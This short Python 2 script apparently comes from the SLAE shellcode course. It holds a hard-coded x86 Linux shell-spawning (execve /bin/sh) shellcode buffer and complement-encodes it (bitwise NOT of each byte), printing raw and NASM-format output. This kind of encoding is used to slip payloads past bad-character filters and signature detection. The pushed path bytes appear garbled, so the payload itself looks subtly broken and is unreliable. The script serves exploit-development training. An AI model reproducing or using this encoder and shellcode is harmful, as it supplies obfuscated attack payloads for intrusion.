#!/usr/bin/env python
#
# Script name		: not-encode.py
# Created following	: SLAE
# Description		: complement encoding
#
import sys
# python objdump2shellcode.py -d <binary> -f raw -b "\x00\xAA"
buf = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# output stored in here
raw = ""
asm = ""

for i in bytearray(buf):
	# Complement Encoding
	b = ~i
	# normal format
	raw += '\\x'
	raw += '%02x' % (b & 0xff)
	# nasm format
	asm += '0x'
	asm += '%02x,' %(b & 0xff)

print raw
print asm
print "[>] Shellcode length : %d\n" % len(bytearray(buf))

